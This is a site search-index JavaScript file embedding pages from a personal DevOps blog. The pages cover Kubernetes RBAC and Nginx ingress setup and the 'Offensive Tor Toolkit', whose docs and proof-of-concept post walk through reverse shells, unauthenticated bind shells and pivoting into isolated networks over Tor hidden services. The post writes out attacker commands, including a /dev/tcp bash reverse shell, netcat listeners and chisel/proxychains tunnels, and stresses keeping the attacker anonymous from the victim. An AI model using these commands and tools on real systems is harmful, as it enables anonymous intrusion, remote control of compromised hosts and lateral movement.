'use strict';(function(){const indexCfg={};indexCfg.doc={id:'id',field:['title','content'],store:['title','href','parent'],};const index=FlexSearch.create(indexCfg);window.geekdocSearchIndex=index;index.add({'id':0,'href':'/geekdoc/posts/','title':"Blog",'parent':"",'content':""});index.add({'id':1,'href':'/geekdoc/projects/offensive-tor-toolkit/getting_started/','title':"Getting Started",'parent':"Offensive Tor Toolkit",'content':"Offensive Tor Toolkit is written in Golang, a language that stands out for its good performance. Offensive Tor Toolkit makes use of the following libraries:\n ipsn/go-libtor: Self-contained Tor from Go. cretz/bine: Go API for using and controlling Tor.  Preparation In order to make the compilation, you can build a docker image as follows:\n$ docker build -t offensive-tor-toolkit . $ docker run -v $(pwd)/dist/:/dist/ -it --rm offensive-tor-toolkit At this moment, Offensive Tor Toolkit tools are available in your dist/ directory.\n You can notice that every single tool has its base64 associated file. This can be useful when transferring the file in text format.\n Once Offensive Tor Toolkit tools are compiled, you can upload the needed file to the victim.\n In order to preserve your anonymity, you can use a temporary file upload service such as Uguu, file.io or FILE.re.\n Here are the main tools:\n reverse-shell-over-tor: Victim sends a Reverse Shell to a Hidden Service. hidden-bind-shell: Victim starts up a Hidden Service with a Bind Shell. hidden-portforwarding: Victim starts a Hidden Service that forwards traffic. Useful for pivoting. tcp2tor-proxy: Victim allows another victim to access a Hidden Service through it. Useful to gaining access to victims in isolated networks.  "});index.add({'id':2,'href':'/geekdoc/wiki/Kubernetes/','title':"Kubernetes",'parent':"Wiki",'content':"Kubernetes is an open source container orchestration engine for automating deployment, scaling, and management of containerized applications.\nTable of Contents:    Kubernetes RBAC: Regulating access to computer or network resources based on the roles of individual users within your organization     Kubernetes Nginx Ingress Controller: Enable Ingress resources in your On-Premise Kubernetes Cluster     "});index.add({'id':3,'href':'/geekdoc/wiki/Kubernetes/rbac/','title':"Kubernetes RBAC",'parent':"Kubernetes",'content':"Here you will find some recipies for configuring RBAC (Role Based Access Control) in your Kubernetes clusters.\nRequisites You should have administrative access to your cluster.\nGeneral concepts  Namespaces: Virtual clusters backed by the same physical cluster. They work as resource pools. Accounts: Every request needs authentication or it is considered as the anonymous user. There are two types of users:  User Accounts: Combinations of IDs and certificates signed by the cluster CA. Click here for more info. Service Accounts: Token authentication. Click here for more info.   Policies: It defines permissions for the RBAC engine. There are two types of policies:  Roles: Permissions within a particular namespace. Click here for more info. ClusterRoles: Permissions within the cluster (non-namespaced). Click here for more info.   Bindings: links Users with Policies. There are two types of bindings:  RoleBindings: It binds any Role or ClusterRole to the same namespace. Click here for more info. ClusterRoleBindings: It binds any ClusterRole to all the namespaces in the cluster. Click here for more info.   Contexts: Cluster-namespace-user relationship. It only makes sense on the client\u0026rsquo;s side.  Creating User Accounts and Roles  Create CSR (Certificate Signing Request):  $ openssl genrsa -out my-user.key 4096 $ openssl req -new -key my-user.key -out my-user.csr -subj \u0026#34;/CN=my-user/O=my-organisation/DC=domain/DC=es\u0026#34;  Note that my-user is the CN (Common Name) of the signed certificate. The other fields are not necessary but convenient.\n Sign the CSR with the cluster CA (Certification Authority):  $ openssl x509 -req -in my-user.csr -CA /etc/kubernetes/ssl/ca.crt -CAkey /etc/kubernetes/ssl/ca.key -CAcreateserial -out my-user.crt -days 356 Create a Role for the User Account:  # Suggestion: Deployer $ kubectl -n my-namespace create role deployer --verb=create,get,delete,list,update,watch,patch --resource=deployments,replicasets,statefulsets,configmaps,pods,secrets,ingresses # Suggestion: Developer $ kubectl -n my-namespace create role developer --verb=get,list,watch --resource=* Create the RoleBindings:  # For User Accounts $ kubectl -n my-namespace create rolebinding deployer --user=my-user --role=deployer $ kubectl -n my-namespace create rolebinding developer --user=my-user --role=developer Configure a Context for kubectl:   Retrieve cluster CA certificate:  # From cluster admin $ kubectl -n kube-system get configmaps extension-apiserver-authentication -o jsonpath=\u0026#39;{.data.client-ca-file}\u0026#39; \u0026gt; ca.crt # Test from client $ curl --cacert ca.crt https://\u0026lt;CLUSTER_IP\u0026gt;:6443/ { \u0026#34;kind\u0026#34;: \u0026#34;Status\u0026#34;, ... \u0026#34;message\u0026#34;: \u0026#34;forbidden: User \\\u0026#34;system:anonymous\\\u0026#34; cannot get path \\\u0026#34;/\\\u0026#34;\u0026#34;, ... }  Create the Context in your kubeconfig:  # Create the Cluster $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-cluster my-cluster --server=https://\u0026lt;CLUSTER_IP\u0026gt;:6443 --certificate-authority=/path/to/my-cluster.ca.crt # Create the Credencials $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-credentials my-user --client-certificate=/path/to/my-user.crt --client-key=/path/to/my-user.key # Create the Context \u0026amp; Switch to the context $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-context my-cluster-my-user --cluster=my-cluster --user=my-user --namespace=my-ns $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config use-context my-cluster-my-user  In order to make use of this configuration files, it might be useful to add these lines to .bashrc:\necho \u0026#39;export KUBECONFIG=\u0026#34;$HOME/.kube/config:\u0026#34;$(find \u0026#34;$HOME/.kube\u0026#34; -name \u0026#34;*.config\u0026#34; | paste -s -d \u0026#34;:\u0026#34;)\u0026#39; \u0026gt;\u0026gt; ~/.bashrc  Creating Service Accounts and ClusterRoles  Create the Service Account and save the generated token.  $ kubectl -n my-ns create serviceaccount admin $ kubectl -n my-ns describe serviceaccounts admin ... Tokens: admin-token-7vpn5 ... $ kubectl -n some-ns get secret admin-token-7vpn5 -o jsonpath=\u0026#39;{.data.token}\u0026#39; | base64 -d \u0026gt; admin-token.txt Create the ClusterRoleBinding.  $ kubectl create clusterrolebinding admin --clusterrole=cluster-admin --serviceaccount=my-ns:admin Configure the Context.  # Create the Cluster $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-cluster my-cluster --server=https://\u0026lt;CLUSTER_IP\u0026gt;:6443 --certificate-authority=/path/to/my-cluster.ca.crt # Create the Credential $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-credentials admin --token=\u0026#34;$(cat admin-token.txt)\u0026#34; # Create the Context \u0026amp; Switch to the context $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config set-context my-cluster-admin --cluster=my-cluster --user=admin --namespace=my-ns $ kubectl config --kubeconfig=$HOME/.kube/my-cluster.config use-context my-cluster-admin "});index.add({'id':4,'href':'/geekdoc/projects/offensive-tor-toolkit/','title':"Offensive Tor Toolkit",'parent':"Projects",'content':"Offensive Tor Toolkit is a series of tools that simplify the use of Tor for typical exploitation and post-exploitation tasks.\nIn exploitation and post-exploitation phases, the victim needs to access Tor. All of this tools have an embedded instance of Tor and they are completely separated from each other. In this way, you only need to upload one file to the victim in order to run the required action.\nSome of this actions are described below. Click on them to see how it works:\n Reverse Shell: The victim connects to a Hidden Service hosted by the attacker. Bind Shell: The victim sets up a Hidden Service that offers a shell session. Local Port Forwarding: The victim routes TCP traffic from a Hidden Service to a port. Useful for accessing internal networks. Remote Port Forwarding: The victim routes TCP traffic from a port to a Hidden Service. Useful for accessing Tor from victims without internet access.  Table of Contents:    Getting Started: First Steps in using Offensive Tor Toolkit     reverse-shell-over-tor: Reverse Shell to a Hidden Service.     hidden-bind-shell: Bind Shell as a Hidden Service.     hidden-portforwarding: Local Port Forwarding over Hidden Service.     tcp2tor-proxy: From TCP to Hidden Service.     "});index.add({'id':5,'href':'/geekdoc/wiki/Kubernetes/nginx-ingress-controller/','title':"Kubernetes Nginx Ingress Controller",'parent':"Kubernetes",'content':"Here you will find documentation about installing and configuring the Nginx Ingress Controller.\nAs described in the bare-metal section, first step is to deploy the controller:\n$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.41.2/deploy/static/provider/baremetal/deploy.yaml Once the deployment has finished, you will see the followings resources:\n$ kubectl -n ingress-nginx get all NAME READY STATUS RESTARTS AGE pod/ingress-nginx-admission-create-w4spq 0/1 Completed 0 5d18h pod/ingress-nginx-admission-patch-7zw79 0/1 Completed 0 5d18h pod/ingress-nginx-controller-5dbd9649d4-wr2bh 1/1 Running 0 5d18h NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/ingress-nginx-controller NodePort 10.233.45.254 \u0026lt;none\u0026gt; 80:32259/TCP,443:31225/TCP 5d18h service/ingress-nginx-controller-admission ClusterIP 10.233.12.164 \u0026lt;none\u0026gt; 443/TCP 5d18h NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/ingress-nginx-controller 1/1 1 1 5d18h ... That means that Nginx Controller is reachable through a NodePort service. In order to balance the traffic between alll the nodes in the cluster, we will use an external Nginx as a Reverse Proxy. Using docker-compose, the needed configuration could be the following:\n# ./docker-compose.yml services: nginx-proxy: image: nginx restart: always ports: - \u0026quot;80:80\u0026quot; - \u0026quot;443:443\u0026quot; volumes: - ./nginx.conf:/etc/nginx/nginx.conf:ro - ./ssl:/etc/nginx/ssl # ./nginx.conf events {} http { upstream controller { server node1:32259 weight=3; server node2:32259; } server { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_pass http://controller; } } } Now that your DNS wildcard (e.g. *.apps.domain.es) points to the balancer, docker-compose can be started:\n$ docker-compose up -d "});index.add({'id':6,'href':'/geekdoc/projects/offensive-tor-toolkit/reverse-shell-over-tor/','title':"reverse-shell-over-tor",'parent':"Offensive Tor Toolkit",'content':"This tool allows the victim to connect to the Hidden Service of the attacker. If the attacker starts a netcat handler, it will give him a shell session.\nSome parameters need to be set:\n$ ./reverse-shell-over-tor -h Usage of reverse-shell-over-tor: -listener string Listener address. Format: \u0026lt;ONION_ADDR\u0026gt;:\u0026lt;PORT\u0026gt; -reverse-shell-program string Program to execute on reverse-shell (default \u0026quot;/bin/sh\u0026quot;) -timeout int Timeout in seconds for Tor setup (default 180) See Gaining access with reverse-shell-over-tor for a real usage example.\n"});index.add({'id':7,'href':'/geekdoc/projects/offensive-tor-toolkit/hidden-bind-shell/','title':"hidden-bind-shell",'parent':"Offensive Tor Toolkit",'content':"This tool allows the victim to set up a new Hidden Service that offers shells to new connections. Then, the attacker can connect to the Hidden Service to receive a shell session.\nSome parameters need to be set:\n$ ./hidden-bind-shell -h Usage of hidden-bind-shell: -bind-shell-program string Program to execute on bind-shell (default \u0026quot;/bin/sh\u0026quot;) -data-dir string Where Tor data is stored. If not defined, a directory is created -hiddensrvport int Tor hidden service port where bind-shell will be started (default 80) -timeout int Timeout in seconds for Tor setup (default 180) See Multi-shell access with bind shell for a real usage example.\n"});index.add({'id':8,'href':'/geekdoc/projects/offensive-tor-toolkit/hidden-portforwarding/','title':"hidden-portforwarding",'parent':"Offensive Tor Toolkit",'content':"This tool allows the victim to set up a new Hidden Service that forwards TCP traffic to a TCP port. Then, the attacker can access the Hidden Service to access the target.\n If the target is a SOCKS proxy, the attacker can pivot easily through the victim to internal networks.\n Some parameters need to be set:\n$ ./hidden-portforwarding -h Usage of hidden-portforwarding: -data-dir string Where Tor data is stored. If not defined, a directory is created -forward string Where the hidden service should forward packets (local port forwarding). Format: \u0026lt;FW_IP\u0026gt;:\u0026lt;FW_PORT\u0026gt;. This parameter is required -hidden-port int Port for onion service (default 80) -timeout int Timeout in seconds for Tor setup (default 180) See Pivoting with hidden-portforwarding and Chisel for a real usage example.\n"});index.add({'id':9,'href':'/geekdoc/projects/offensive-tor-toolkit/tcp2tor-proxy/','title':"tcp2tor-proxy",'parent':"Offensive Tor Toolkit",'content':"This tool allows the victim to set up a service that forwards TCP traffic to a Hidden Service. Then, an victim inside an internal network can access a Hidden Service pivoting over the victim that executes this tool.\nSome parameters need to be set:\n$ ./tcp2tor-proxy -h Usage of tcp2tor-proxy: -listen string TCP Socket to listen on. Format: [\u0026lt;IP\u0026gt;]:\u0026lt;PORT\u0026gt; (default \u0026quot;127.0.0.1:60101\u0026quot;) -onion-forward string Hidden service to proxy. Format: \u0026lt;ONION\u0026gt;:\u0026lt;PORT\u0026gt;. This parameter is required -timeout int Timeout in seconds for Tor setup (default 180) See Remote port forwarding through Tor for a real usage example.\n"});index.add({'id':10,'href':'/geekdoc/','title':"",'parent':'','content':"Welcome to my personal blog! \nMy name is Álvaro Torres Cogollo and I work as a SysAdmin-DevOps Engineer and I am a passionate about cyber security and technology.\nThe aim of this site is to contribute to the Open Source Community in the following manner:\nProjects Here you will find some documentation about my personal projects. Click here for more info.\nWiki Here you will find some documentation about procedures and configurations of some software. Click here for more info.\nPosts Here is where you can find the documentation described above applied to real scenarios. Click here to access to post page.\n"});index.add({'id':11,'href':'/geekdoc/posts/offensive-tor-toolkit/','title':"Offensive Tor Toolkit PoC",'parent':"Blog",'content':"In this post we will be showing how to use Offensive Tor Toolkit for pentesting over Tor. This suite of tools will allow us to execute exploitation and post-exploitation tasks from the victim preserving the attacker anonymity. For more info, check the docs.\nFirst of all, we have the following vulnerable scenario:\n Victim1 serves a vulnerable service to Internet. Victim2 serves a vulnerable service to the internal network and it has no access to Internet.  \n Gaining access with reverse-shell-over-tor We assume that we are able to execute commands in Victim1 in some way. Then, to obtain a reverse shell preserving anonymity, we will use reverse-shell-over-tor from Offensive Tor Toolkit as follows:\n Attacker: run the handler reachable from a Hidden Service.  [attacker]$ grep \u0026#39;^HiddenService\u0026#39; /etc/tor/torrc HiddenServiceDir /tmp/tortest HiddenServicePort 4444 127.0.0.1:4444 [attacker]$ cat /tmp/tortest/hostname m5et..jyd.onion [attacker]$ nc -lvnp 4444  Victim1: download and execute reverse-shell-over-tor.  [victim1]$ ./reverse-shell-over-tor \\  -listener m5et..jyd.onion:4444  Attacker: reverse shell is catched with the handler.  [attacker]$ nc -lvnp 1234 ... id uid=48(apache) gid=48(apache) groups=48(apache) \n Multi-shell access with bind shell In order to get a bind shell served by Victim1, we will use hidden-bind-shell as follows:\n Victim1: download and execute hidden-bind-shell.  [victim1]$ ./hidden-bind-shell \\  -data-dir /tmp/datadir/ \\  -hiddensrvport 1234 ... Bind shell is listening on hgnzi6j3rqog6yew.onion:1234  Attacker: connect to the Hidden Service to get a shell session.  [attacker]$ alias nctor=\u0026#39;nc --proxy 127.0.0.1:9050 --proxy-type socks5\u0026#39; [attacker]$ nctor -v hgnzi6j3rqog6yew.onion 1234 ... id uid=48(apache) gid=48(apache) groups=48(apache)  It should be noted that data-dir flag will allow us to start the service always in the same onion address.\n  Currently, this bind shell has no authentication. This means that this bind shell for persistent purposes can be dangerous.\n \n Pivoting with hidden-portforwarding and Chisel At this point, Victim1 is already compromised. In order to reach Victim2 (the isolated network machine), we will use Victim1. To achieve our goal, we will use hidden-portforwarding together with Chisel.\nWith this approach, we will set up a Hidden Service in Victim1 that redirects to the Chisel server. Thus, from the attacker we can generate a tunnel with the Chisel client on which to send traffic.\n Chisel client allows the attacker to generate a tunnel to the Chisel server.\n  Victim1: Run the Chisel Server to listen on 127.0.0.1:1111 and hidden-portforwarding.  [victim1]$ ./chisel server -p 1111 --socks5 \u0026amp; [victim1]$ ./hidden-portforwarding \\  -data-dir /tmp/pf-datadir \\  -forward 127.0.0.1:1111 \\  -hidden-port 9001 ... Forwarding xa7ljkruk7lra4el.onion:9001 -\u0026gt; 127.0.0.1:1111  Attacker: Connect Chisel client to the Chisel server through the Hidden Service.  [attacker]$ alias chisel-client-tor=\u0026#39;chisel client --proxy socks://127.0.0.1:9050\u0026#39; [attacker]$ chisel-client-tor xa7ljkruk7lra4el.onion:9001 socks \u0026amp; [attacker]$ ss -lntp | grep chisel LISTEN 0 4096 127.0.0.1:1080 0.0.0.0:* users:((\u0026#34;chisel\u0026#34;,pid=3730,fd=3)) Now, Chisel client is listening as a SOCKS5 proxy so that traffic sent through the proxy goes out through Victim1. All you need to reach Victim2 is to connect to this proxy as follows:\n[attacker]$ alias pc4=\u0026#39;proxychains4 -f /etc/proxychains4.conf\u0026#39; [attacker]$ cat /etc/proxychains4.conf ... [ProxyList] socks5 127.0.0.1 1080 [attacker]$ pc4 nmap -sT -Pn -n -sV -sC -p80,22,25,3000 victim2 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.43 (() PHP/5.4.16) 3000/tcp open http Mongoose httpd ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 230.37 seconds \nRemote port forwarding through Tor Victim2 does not have Internet access, so we cannot access Tor directly from it. Alternatively, we can use tcp2tor-proxy to have Victim1 used as a Tor proxy for Victim2.\n Victim1: Set up the remote port forwarding so that 127.0.0.1:60101 will reach the Hidden Service.  [victim1]$ ./tcp2tor-proxy -listen 0.0.0.0:60101 -onion-forward m5et..jyd.onion:4444 ... Proxying 0.0.0.0:60101 -\u0026gt; m5et..jyd.onion:4444  Attacker: Set up a handler to received reverse shells.  [attacker]$ nc -lnvp 1234  Victim2: Send the reverse shell to Victim1 (tcp2tor-proxy).  [victim2]$ bash -i \u0026gt;\u0026amp; /dev/tcp/victim1/60101 0\u0026gt;\u0026amp;1  Attacker: Receive the reverse shell  [attacker]$ nc -lnvp 1234 ... id uid=48(apache) gid=48(apache) groups=48(apache) \n"});index.add({'id':12,'href':'/geekdoc/categories/','title':"Categories",'parent':"",'content':""});index.add({'id':13,'href':'/geekdoc/projects/','title':"Projects",'parent':"",'content':"Here you will find some documentation about my personal projects.\n   Offensive Tor Toolkit: Pentesting Tor utilities     Getting Started: First Steps in using Offensive Tor Toolkit     reverse-shell-over-tor: Reverse Shell to a Hidden Service.     hidden-bind-shell: Bind Shell as a Hidden Service.     hidden-portforwarding: Local Port Forwarding over Hidden Service.     tcp2tor-proxy: From TCP to Hidden Service.       "});index.add({'id':14,'href':'/geekdoc/tags/','title':"Tags",'parent':"",'content':""});index.add({'id':15,'href':'/geekdoc/wiki/','title':"Wiki",'parent':"",'content':"Here you will find some documentation about procedures and configurations of some software and technologies.\n   Kubernetes     Kubernetes RBAC: Regulating access to computer or network resources based on the roles of individual users within your organization     Kubernetes Nginx Ingress Controller: Enable Ingress resources in your On-Premise Kubernetes Cluster       "});})();